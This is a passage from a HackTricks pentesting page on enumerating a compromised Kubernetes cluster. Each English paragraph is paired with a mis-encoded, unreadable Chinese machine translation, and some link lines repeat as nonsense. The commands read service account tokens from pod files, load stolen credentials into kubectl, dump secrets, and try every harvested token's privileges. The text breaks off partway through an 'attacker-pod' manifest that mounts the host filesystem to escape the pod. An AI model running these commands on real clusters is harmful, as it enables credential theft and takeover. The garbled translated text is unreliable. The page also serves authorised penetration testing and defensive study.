

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>æ”¯æŒhacktrickså¹¶è·å¾—å¥½å¤„ï¼</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿ æ‚¨æ˜¯å¦æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨hacktricks **ä¸­åˆŠç™»å¹¿å‘Šï¼Ÿ è¿˜æ˜¯æ‚¨æƒ³è®¿é—®**æœ€æ–°ç‰ˆæœ¬çš„è±Œè±†æˆ–åœ¨pdf **ä¸­ä¸‹è½½hacktricksï¼Ÿ æ£€æŸ¥[**è®¢é˜…è®¡åˆ’**]ï¼ˆhttps://github.com/sponsors/carlospolopï¼‰ï¼

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - å‘ç°[**è±Œè±†å®¶åº­**]ï¼ˆhttps://opensea.io/collection/the-peass-familyï¼‰ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[** nfts **]ï¼ˆhttps://opensea.io/collectionï¼‰ /å®¶åº­å®¶åº­ï¼‰

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - è·å–[**å®˜æ–¹è±Œè±†å’Œhacktricksèµƒç‰©**]ï¼ˆhttps://peass.creator-spring.comï¼‰

- **Join the** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **åŠ å…¥** [**ğŸ’¬**]ï¼ˆhttps://emojipedia.org/speech-balloon/ï¼‰[** discord group **]ï¼ˆhttps://discord.gg/hrep4ruj7fï¼‰æˆ–[ **ç”µæŠ¥ç»„**]ï¼ˆhttps://t.me/peassï¼‰æˆ–**åœ¨** Twitter ** [**ğŸ¦**]ï¼ˆhttps://github.com/carloppolop/hacktrickss on ** twitter **ï¼‰ /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.mdï¼‰eardme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **é€šè¿‡å°†PRSæäº¤ç»™** [** hacktricks github repo **]ï¼ˆhttps://github.com/carloppolop/hacktricksï¼‰**ã€‚

</details>


# Kubernetes Tokens

If you have compromised access to a machine the user may have access to some Kubernetes platform. The token is usually located in a file pointed by the **env var `KUBECONFIG`** or **inside `~/.kube`**.

å¦‚æœæ‚¨å¦¥åäº†å¯¹æœºå™¨çš„è®¿é—®æƒé™ï¼Œåˆ™ç”¨æˆ·å¯èƒ½å¯ä»¥è®¿é—®æŸäº›Kuberneteså¹³å°ã€‚ ä»¤ç‰Œé€šå¸¸ä½äº** env var` kubeconfig` ** **æˆ–**å†…éƒ¨çš„æ–‡ä»¶ä¸­æŒ‡å‘çš„æ–‡ä»¶ä¸­ã€‚

In this folder you might find config files with **tokens and configurations to connect to the API server**. In this folder you can also find a cache folder with information previously retrieved.

åœ¨æ­¤æ–‡ä»¶å¤¹ä¸­ï¼Œæ‚¨å¯èƒ½ä¼šæ‰¾åˆ°å…·æœ‰**ä»¤ç‰Œå’Œé…ç½®çš„é…ç½®æ–‡ä»¶ï¼Œä»¥è¿æ¥åˆ°APIæœåŠ¡å™¨**ã€‚ åœ¨æ­¤æ–‡ä»¶å¤¹ä¸­ï¼Œæ‚¨è¿˜å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå¸¦æœ‰å…ˆå‰æ£€ç´¢ä¿¡æ¯çš„ç¼“å­˜æ–‡ä»¶å¤¹ã€‚

If you have compromised a pod inside a kubernetes environment, there are other places where you can find tokens and information about the current K8 env:

å¦‚æœæ‚¨åœ¨Kubernetesç¯å¢ƒä¸­å¦¥åäº†ä¸€ä¸ªPODï¼Œæ‚¨å¯ä»¥åœ¨å…¶ä»–åœ°æ–¹æ‰¾åˆ°æœ‰å…³å½“å‰K8 Envçš„ä»¤ç‰Œå’Œä¿¡æ¯ï¼š

## Service Account Tokens

##æœåŠ¡å¸æˆ·ä»¤ç‰Œ

Before continuing, if you don't know what is a service in Kubernetes I would suggest you to [**follow this link and read at least the information about Kubernetes architecture**](../../pentesting/pentesting-kubernetes/#architecture)**.**

åœ¨ç»§ç»­ä¹‹å‰ï¼Œå¦‚æœæ‚¨ä¸çŸ¥é“Kubernetesçš„æœåŠ¡æ˜¯ä»€ä¹ˆï¼Œæˆ‘å»ºè®®æ‚¨[**éµå¾ªæ­¤é“¾æ¥å¹¶è‡³å°‘é˜…è¯»æœ‰å…³Kubernetes Architecture **]ï¼ˆ../ ../ ../ pentesting/pentesting/pentesting-kubernetes /ï¼ƒå»ºç­‘å­¦ï¼‰**ã€‚**

Taken from the Kubernetes [documentation](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server):

å–è‡ªKubernetes [Documentation]ï¼ˆhttps://kubernetes.io/docs/tasks/configure-pod-container/configure-service-service-account/#use-the-peauls-the-default-the-default-service-service-service-service-serviceä¸€ä¸‹ -æœåŠ¡å™¨ï¼‰ï¼š

_â€œWhen you create a pod, if you do not specify a service account, it is automatically assigned the_ default _service account in the same namespace.â€_

_â€œåˆ›å»ºPODæ—¶ï¼Œå¦‚æœæœªæŒ‡å®šæœåŠ¡å¸æˆ·ï¼Œåˆ™å°†è‡ªåŠ¨åˆ†é…_é»˜è®¤default _service _serviceå¸æˆ·ã€‚â€ _ _ _

**ServiceAccount** is an object managed by Kubernetes and used to provide an identity for processes that run in a pod.\

** ServiceAccount **æ˜¯ç”±Kubernetesç®¡ç†çš„å¯¹è±¡ï¼Œç”¨äºä¸ºåœ¨Podä¸­è¿è¡Œçš„è¿‡ç¨‹æä¾›èº«ä»½ã€‚\ \
Every service account has a secret related to it and this secret contains a bearer token. This is a JSON Web Token (JWT), a method for representing claims securely between two parties.

æ¯ä¸ªæœåŠ¡å¸æˆ·éƒ½æœ‰ä¸ä¹‹ç›¸å…³çš„ç§˜å¯†ï¼Œå¹¶ä¸”æ­¤ç§˜å¯†åŒ…å«ä¸€ä¸ªæŒæœ‰äººä»¤ç‰Œã€‚ è¿™æ˜¯JSON Webä»¤ç‰Œï¼ˆJWTï¼‰ï¼Œæ˜¯ä¸€ç§åœ¨ä¸¤æ–¹ä¹‹é—´å®‰å…¨åœ°è¡¨ç¤ºç´¢èµ”çš„æ–¹æ³•ã€‚

Usually **one** of the directories:

é€šå¸¸**ç›®å½•ä¸­çš„ä¸€ä¸ª**ï¼š

* `/run/secrets/kubernetes.io/serviceaccount`

*`/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`

*`/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

*`/secrets/kubernetes.io/serviceaccount`

contain the files:

åŒ…å«æ–‡ä»¶ï¼š

* **ca.crt**: It's the ca certificate to check kubernetes communications

*** ca.crt **ï¼šè¿™æ˜¯æ£€æŸ¥Kubernetes Communicationsçš„CAè¯ä¹¦
* **namespace**: It indicates the current namespace

***åç§°ç©ºé—´**ï¼šå®ƒæŒ‡ç¤ºå½“å‰åç§°ç©ºé—´
* **token**: It contains the **service token** of the current pod.

***ä»¤ç‰Œ**ï¼šå®ƒåŒ…å«å½“å‰åŠèˆ±çš„**æœåŠ¡ä»¤ç‰Œ**ã€‚

Now that you have the token, you can find the API server inside the environment variable **`KUBECONFIG`**. For more info run `(env | set) | grep -i "kuber|kube`**`"`**

ç°åœ¨æ‚¨å·²ç»æ‹¥æœ‰ä»¤ç‰Œï¼Œå¯ä»¥åœ¨ç¯å¢ƒå˜é‡å†…æ‰¾åˆ°APIæœåŠ¡å™¨**``kubeconfig` **'ã€‚ æœ‰å…³æ›´å¤šä¿¡æ¯è¿è¡Œ`ï¼ˆenv | setï¼‰| grep -iâ€œ kuber | kubeâ€ **``**

The service account token is being signed by the key residing in the file **sa.key** and validated by **sa.pub**.

æœåŠ¡å¸æˆ·ä»¤ç‰Œç”±ä½äºæ–‡ä»¶** sa.key **ä¸­çš„å¯†é’¥ç­¾åï¼Œå¹¶ç”±** sa.pub **éªŒè¯ã€‚

Default location on **Kubernetes**:

** kubernetes **ä¸Šçš„é»˜è®¤ä½ç½®ï¼š

* /etc/kubernetes/pki

Default location on **Minikube**:

** minikube **ä¸Šçš„é»˜è®¤ä½ç½®ï¼š

* /var/lib/localkube/certs

## Hot Pods

_**Hot pods are**_ pods containing a privileged service account token. A privileged service account token is a token that has permission to do privileged tasks such as listing secrets, creating pods, etc.

_ **çƒ­åŠèˆ±æ˜¯** _ podï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªç‰¹æƒæœåŠ¡å¸æˆ·ä»¤ç‰Œã€‚ ç‰¹æƒæœåŠ¡å¸æˆ·ä»¤ç‰Œæ˜¯ä¸€ä¸ªä»¤ç‰Œï¼Œå®ƒæœ‰æƒæ‰§è¡Œç‰¹æƒä»»åŠ¡ï¼Œä¾‹å¦‚åˆ—å‡ºç§˜å¯†ï¼Œåˆ›å»ºPODï¼Œç­‰ç­‰ã€‚

# RBAC

ï¼ƒRBAC

If you don't know what is **RBAC**, [**read this section**](../../pentesting/pentesting-kubernetes/#cluster-hardening-rbac).

å¦‚æœæ‚¨ä¸çŸ¥é“ä»€ä¹ˆæ˜¯** rbac **ï¼Œ[**é˜…è¯»æœ¬èŠ‚**]ï¼ˆ../../ pentesting/pentesting-kubernetes/ï¼ƒcluster-hardening-rbacï¼‰ã€‚

# Enumeration CheatSheet

ï¼ƒæšä¸¾å¤‡å¿˜å•

In order to enumerate a K8s environment you need a couple of this:

ä¸ºäº†åˆ—ä¸¾K8Sç¯å¢ƒï¼Œæ‚¨éœ€è¦ä¸€äº›ï¼š

* A **valid authentication token**. In the previous section we saw where to search for a user token and for a service account token.

*A **æœ‰æ•ˆçš„èº«ä»½éªŒè¯ä»¤ç‰Œ**ã€‚ åœ¨ä¸Šä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†åœ¨å“ªé‡Œæœç´¢ç”¨æˆ·ä»¤ç‰Œå’ŒæœåŠ¡å¸æˆ·ä»¤ç‰Œã€‚
* The **address (**_**https://host:port**_**) of the Kubernetes API**. This can be usually found in the environment variables and/or in the kube config file.

***åœ°å€ï¼ˆ** _ ** httpsï¼š//ä¸»æœºï¼šport ** _ **ï¼‰kubernetes api **ã€‚ è¿™é€šå¸¸å¯ä»¥åœ¨ç¯å¢ƒå˜é‡å’Œ/æˆ–Kubeé…ç½®æ–‡ä»¶ä¸­æ‰¾åˆ°ã€‚
* **Optional**: The **ca.crt to verify the API server**. This can be found in the same places the token can be found. This is useful to verify the API server certificate, but using `--insecure-skip-tls-verify` with `kubectl` or `-k` with `curl` you won't need this.

***å¯é€‰**ï¼š** ca.crtéªŒè¯APIæœåŠ¡å™¨**ã€‚ è¿™å¯ä»¥åœ¨å¯ä»¥æ‰¾åˆ°ä»¤ç‰Œçš„åŒä¸€ä½ç½®æ‰¾åˆ°ã€‚ è¿™å¯¹äºéªŒè¯APIæœåŠ¡å™¨è¯ä¹¦å¾ˆæœ‰ç”¨ï¼Œä½†æ˜¯ä½¿ç”¨`curl'ä½¿ç”¨`kubectl`æˆ–`-K'ä½¿ç”¨`iNsecure-skip-tls-verify''æ‚¨ä¸éœ€è¦æ­¤ã€‚

With those details you can **enumerate kubernetes**. If the **API** for some reason is **accessible** through the **Internet**, you can just download that info and enumerate the platform from your host.

æœ‰äº†è¿™äº›ç»†èŠ‚ï¼Œæ‚¨å¯ä»¥**åˆ—ä¸¾kubernetes **ã€‚ å¦‚æœç”±äºæŸç§åŸå› ** api **é€šè¿‡**äº’è”ç½‘**è®¿é—®**ï¼Œåˆ™å¯ä»¥ä¸‹è½½è¯¥ä¿¡æ¯å¹¶ä»ä¸»æœºä¸­æšä¸¾å¹³å°ã€‚

However, usually the **API server is inside an internal network**, therefore you will need to **create a tunnel** through the compromised machine to access it from your machine, or you can **upload the** [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) binary, or use **`curl/wget/anything`** to perform raw HTTP requests to the API server.

ä½†æ˜¯ï¼Œé€šå¸¸** APIæœåŠ¡å™¨åœ¨å†…éƒ¨ç½‘ç»œå†…**ï¼Œå› æ­¤æ‚¨éœ€è¦**é€šè¿‡æŠ˜è¡·çš„æœºå™¨åˆ›å»ºéš§é“**ä»¥ä»è®¡ç®—æœºè®¿é—®å®ƒï¼Œæˆ–è€…æ‚¨å¯ä»¥**ä¸Šä¼ ** [** *kubectl **]ï¼ˆhttps://kubernetes.io/docs/tasks/tools/tools/install-kubectl-linux/#install-kubectl-binary-binary-with-curl-on-linuxï¼‰ï¼Œæˆ–ä½¿ç”¨** WGET/ä»»ä½•â€œ **â€ä»¥å¯¹APIæœåŠ¡å™¨æ‰§è¡ŒRAW HTTPè¯·æ±‚ã€‚

## Differences between `list` and `get` verbs

With **`get`** permissions you can access information of specific assets (_`describe` option in `kubectl`_) API:

ä½¿ç”¨**``get'**æƒé™æ‚¨å¯ä»¥è®¿é—®ç‰¹å®šèµ„äº§çš„ä¿¡æ¯ï¼ˆ_`describe`é€‰é¡¹in`kubectl`_ï¼‰apiï¼š

```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```

If you have the **`list`** permission, you are allowed to execute API requests to list a type of asset (_`get` option in `kubectl`_):

å¦‚æœæ‚¨æœ‰â€œåˆ—è¡¨â€ **æƒé™ï¼Œåˆ™å…è®¸æ‚¨æ‰§è¡ŒAPIè¯·æ±‚ä»¥åˆ—å‡ºä¸€ç§èµ„äº§ç±»å‹ï¼ˆ`kubectl`__ï¼‰ä¸­çš„ä¸€ç§ï¼š

```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```

If you have the **`watch`** permission, you are allowed to execute API requests to monitor assets:

å¦‚æœæ‚¨æœ‰**````watch''**''è®¸å¯ï¼Œåˆ™å…è®¸æ‚¨æ‰§è¡ŒAPIè¯·æ±‚ä»¥ç›‘è§†èµ„äº§ï¼š

```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```

They open a streaming connection that returns you the full manifest of a Deployment whenever it changes (or when a new one is created).

ä»–ä»¬æ‰“å¼€æµåª’ä½“è¿æ¥ï¼Œè¯¥è¿æ¥åœ¨éƒ¨ç½²æ›´æ”¹æ—¶ï¼ˆæˆ–åˆ›å»ºæ–°çš„ï¼‰æ—¶å°†è¿”å›éƒ¨ç½²çš„å®Œæ•´æ¸…å•ã€‚

{% hint style="danger" %}
The following `kubectl` commands indicates just how to list the objects. If you want to access the data you need to use `describe` instead of `get`

ä»¥ä¸‹`kubectl`å‘½ä»¤æŒ‡ç¤ºå¦‚ä½•åˆ—å‡ºå¯¹è±¡ã€‚ å¦‚æœæ‚¨æƒ³è®¿é—®æ•°æ®ï¼Œåˆ™éœ€è¦ä½¿ç”¨``æè¿°''è€Œä¸æ˜¯``get''
{% endhint %}

## Using curl

##ä½¿ç”¨å·å‘

From inside a pod you can use several env variables:

```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
```

## Using kubectl

Having the token and the address of the API server you use kubectl or curl to access it as indicated here:

ä½¿ç”¨kubectlæˆ–curlçš„ä»£å¸å’ŒAPIæœåŠ¡å™¨çš„åœ°å€å¦‚ä¸‹æ‰€ç¤ºï¼š

```bash
alias k='kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify=true'
```

You can find an [**official kubectl cheatsheet here**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). The goal of the following sections is to present in ordered manner different options to enumerate and understand the new K8s you have obtained access to.

æ‚¨å¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°[**å®˜æ–¹çš„kubectlä½œå¼Šè¡¨**]ï¼ˆhttps://kubernetes.io/docs/reference/kubectl/cheatsheet/ï¼‰ã€‚ ä»¥ä¸‹å„èŠ‚çš„ç›®æ ‡æ˜¯ä»¥æœ‰åºçš„æ–¹å¼å‘ˆç°ä¸åŒçš„é€‰é¡¹ï¼Œä»¥åˆ—ä¸¾å’Œäº†è§£æ‚¨è·å¾—çš„æ–°K8è®¿é—®æƒé™ã€‚

To find the HTTP request that `kubectl` sends you can use the parameter `-v=8`

è¦æŸ¥æ‰¾â€œ kubectlâ€å‘é€çš„httpè¯·æ±‚ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å‚æ•°`-v = 8```

## Current Configuration

##å½“å‰é…ç½®

{% tabs %}
{% tab title="Kubectl" %}

{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

If you managed to steal some users credentials you can **configure them locally** using something like:

å¦‚æœæ‚¨è®¾æ³•çªƒå–äº†æŸäº›ç”¨æˆ·å‡­æ®ï¼Œåˆ™å¯ä»¥**ä½¿ç”¨ç±»ä¼¼çš„ä¸œè¥¿åœ¨æœ¬åœ°é…ç½®å®ƒä»¬ã€‚

```bash
kubectl config set-credentials USER_NAME \
   --auth-provider=oidc \
   --auth-provider-arg=idp-issuer-url=( issuer url ) \
   --auth-provider-arg=client-id=( your client id ) \
   --auth-provider-arg=client-secret=( your client secret ) \
   --auth-provider-arg=refresh-token=( your refresh token ) \
   --auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
   --auth-provider-arg=id-token=( your id_token )
```

## Get Supported Resources

##è·å¾—æ”¯æŒçš„èµ„æº

With this info you will know all the services you can list

æœ‰äº†æ­¤ä¿¡æ¯ï¼Œæ‚¨å°†çŸ¥é“æ‚¨å¯ä»¥åˆ—å‡ºçš„æ‰€æœ‰æœåŠ¡

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{% endtab %}
{% endtabs %}

## Get Current Privileges

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
    "https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

You can learn more about **Kubernetes RBAC** in

æ‚¨å¯ä»¥äº†è§£æœ‰å…³** kubernetes rbac **çš„æ›´å¤šä¿¡æ¯

{% content-ref url="../../pentesting/pentesting-kubernetes/kubernetes-role-based-access-control-rbac.md" %}

{ï¼…content-ref url =â€œ ../../ pentesting/pentesting-kubernetes/kubernetes-con-concess-control-rbac.mdâ€œï¼…}
[kubernetes-role-based-access-control-rbac.md](../../pentesting/pentesting-kubernetes/kubernetes-role-based-access-control-rbac.md)

[åŸºäºkubernetes-lole-access-control-rbac.md]ï¼ˆ../../ pentesting/pentesting/pentesting-kubernetes/kubernetes-loleåŸºäºåŸºäº -  access-access-control-rbac.mdï¼‰
{% endcontent-ref %}

**Once you know which privileges** you have, check the following page to figure out **if you can abuse them** to escalate privileges:

**ä¸€æ—¦çŸ¥é“äº†å“ªä¸ªç‰¹æƒ**ï¼Œè¯·æ£€æŸ¥ä»¥ä¸‹é¡µé¢ä»¥æ‰¾å‡º**å¦‚æœæ‚¨å¯ä»¥æ»¥ç”¨å®ƒä»¬**ä»¥å‡çº§ç‰¹æƒï¼š

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}

{ï¼…content-ref url =â€œ abusing-rustroles-clusterroles in-kubernetes/â€œï¼…}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)

[æ»¥ç”¨å¼º - ç¾¤ç°‡ä¸­çš„kubernetes]ï¼ˆæ»¥ç”¨é‡å¤ç¾¤ä½“ç°‡ä¸­çš„kubernetes/ï¼‰/ï¼‰
{% endcontent-ref %}

## Get Others roles

##è·å¾—å…¶ä»–è§’è‰²

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

## Get namespaces

Kubernetes supports **multiple virtual clusters** backed by the same physical cluster. These virtual clusters are called **namespaces**.

Kubernetesæ”¯æŒ**å¤šä¸ªè™šæ‹Ÿç°‡**ç”±ç›¸åŒçš„ç‰©ç†ç¾¤é›†æ”¯æŒã€‚ è¿™äº›è™šæ‹Ÿç¾¤é›†ç§°ä¸º**åç§°ç©ºé—´**ã€‚

{% tabs %}
{% tab title="kubectl" %}
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
{% endtab %}
{% endtabs %}

## Get secrets

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

curl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

If you can read secrets you can use the following lines to get the privileges related to each to token:

å¦‚æœæ‚¨å¯ä»¥é˜…è¯»ç§˜å¯†ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¡Œå°†ä¸æ¯ä¸ªäººç›¸å…³çš„ç‰¹æƒè·å–åˆ°ä»¤ç‰Œï¼š

```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```

## Get Service Accounts

##è·å–æœåŠ¡å¸æˆ·

As discussed at the begging of this page **when a pod is run a service account is usually assigned to it**. Therefore, listing the service accounts, their permissions and where are they running may allow a user to escalate privileges.

æ­£å¦‚è¯¥é¡µé¢çš„ä¹è®¨ä¸­æ‰€è®¨è®ºçš„é‚£æ ·**è¿è¡ŒåŠèˆ±æ—¶ï¼Œé€šå¸¸å°†æœåŠ¡å¸æˆ·åˆ†é…ç»™å®ƒ**ã€‚ å› æ­¤ï¼Œåˆ—å‡ºæœåŠ¡å¸æˆ·ï¼Œå…¶æƒé™ä»¥åŠåœ¨ä½•å¤„è¿è¡Œçš„æƒé™å¯èƒ½å…è®¸ç”¨æˆ·å‡çº§ç‰¹æƒã€‚

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}
```bash
curl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{% endtab %}
{% endtabs %}

## Get Deployments

The deployments specify the **components** that need to be **run**.

éƒ¨ç½²æŒ‡å®šéœ€è¦**çš„**ç»„ä»¶** **ã€‚

{% tabs %}
{% tab title="kubectl" %}
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
curl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

## Get Pods

The Pods are the actual **containers** that will **run**.

è±†èšæ˜¯å°†**è¿è¡Œ**çš„å®é™…**å®¹å™¨**ã€‚

{% tabs %}
{% tab title="kubectl" %}
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
curl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

## Get Services

##è·å–æœåŠ¡

Kubernetes **services** are used to **expose a service in a specific port and IP** (which will act as load balancer to the pods that are actually offering the service). This is interesting to know where you can find other services to try to attack.

Kubernetes **æœåŠ¡**ç”¨äº**åœ¨ç‰¹å®šç«¯å£å’ŒIP **ä¸­å…¬å¼€æœåŠ¡ï¼ˆè¿™å°†å……å½“å®é™…æä¾›æœåŠ¡çš„Podsçš„è´Ÿè½½å¹³è¡¡å™¨ï¼‰ã€‚ å¾ˆæœ‰è¶£çš„æ˜¯ï¼Œæ‚¨å¯ä»¥åœ¨å“ªé‡Œæ‰¾åˆ°å…¶ä»–æœåŠ¡æ¥å°è¯•æ”»å‡»ã€‚

{% tabs %}
{% tab title="kubectl" %}
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
curl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

## Get nodes

Get all the **nodes configured inside the cluster**.

è·å–æ‰€æœ‰**èŠ‚ç‚¹åœ¨ç¾¤é›†ä¸­**å†…é…ç½®ã€‚

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %}
```bash
curl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

## Get DaemonSets

**DaeamonSets** allows to ensure that a **specific pod is running in all the nodes** of the cluster (or in the ones selected). If you delete the DaemonSet the pods managed by it will be also removed.

** daeamonset **å…è®¸ç¡®ä¿åœ¨ç¾¤é›†çš„æ‰€æœ‰èŠ‚ç‚¹ä¸­è¿è¡Œä¸€ä¸ªç‰¹å®šçš„PODï¼ˆæˆ–åœ¨æ‰€é€‰çš„ç¾¤é›†ä¸­ï¼‰ã€‚ å¦‚æœåˆ é™¤å®ˆæŠ¤ç¨‹åºï¼Œåˆ™å°†åˆ é™¤ç”±å…¶ç®¡ç†çš„åŠèˆ±ã€‚

{% tabs %}
{% tab title="kubectl" %}
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %}
```bash
curl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{% endtab %}
{% endtabs %}

## Get cronjob

Cron jobs allows to schedule using crontab like syntax the launch of a pod that will perform some action.

CRON Jobså…è®¸ä½¿ç”¨åƒè¯­æ³•è¿™æ ·çš„crontabå®‰æ’å¯åŠ¨å°†æ‰§è¡Œä¸€äº›æ“ä½œçš„PODçš„å¯åŠ¨ã€‚

{% tabs %}
{% tab title="kubectl" %}
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %}
```bash
curl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

## Get "all"

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
{% endtab %}
{% endtabs %}

## **Get Pods consumptions**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

## Escaping from the pod

##é€ƒç¦»è±†èš

If you are able to create new pods you might be able to escape from them to the node. In order to do so you need to create a new pod using a yaml file, switch to the created pod and then chroot into the node's system. You can use already existing pods as reference for the yaml file since they display existing images and pathes.

å¦‚æœæ‚¨èƒ½å¤Ÿåˆ›å»ºæ–°çš„è±†èšï¼Œåˆ™å¯ä»¥ä»å®ƒä»¬é€ƒè„±åˆ°èŠ‚ç‚¹ã€‚ ä¸ºäº†è¿™æ ·åšï¼Œæ‚¨éœ€è¦ä½¿ç”¨YAMLæ–‡ä»¶åˆ›å»ºä¸€ä¸ªæ–°çš„PODï¼Œç„¶ååˆ‡æ¢åˆ°åˆ›å»ºçš„PODï¼Œç„¶åå°†å…¶åˆ‡å…¥èŠ‚ç‚¹çš„ç³»ç»Ÿã€‚ æ‚¨å¯ä»¥ä½¿ç”¨ç°æœ‰çš„PODä½œä¸ºYAMLæ–‡ä»¶çš„å‚è€ƒï¼Œå› ä¸ºå®ƒä»¬æ˜¾ç¤ºäº†ç°æœ‰çš„å›¾åƒå’Œè·¯å¾„ã€‚

```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```

Then you create your attack.yaml file

ç„¶åæ‚¨åˆ›å»ºæ”»å‡».yamlæ–‡ä»¶

```yaml
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: attacker-pod
  name: attacker-pod
  namespace: default
spec:
  volumes:
  - name: host-fs
    hostPath:
      path: /
  containers:
  - image: ubuntu
